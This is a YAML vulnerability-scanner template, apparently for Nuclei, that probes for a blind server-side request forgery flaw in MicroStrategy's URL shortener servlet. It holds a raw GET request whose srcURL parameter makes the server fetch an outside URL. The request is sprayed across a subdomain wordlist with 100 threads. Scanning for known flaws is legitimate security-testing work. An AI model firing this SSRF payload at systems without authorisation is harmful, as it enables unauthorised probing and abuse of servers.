id: microstrategy-ssrf 2
info:
  author: organiccrap
  description: Blind server-side request forgery vulnerability on MicroStrategy URL
    shortener.
  name: MicroStrategy tinyurl - BSSRF
  reference: https://medium.com/@win3zz/how-i-made-31500-by-submitting-a-bug-to-facebook-d31bb046e204
  severity: high
  tags: microstrategy,ssrf
requests:
- attack: sniper
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - taskResponse
    - The source URL is not valid
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com
    HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
  threads: 100
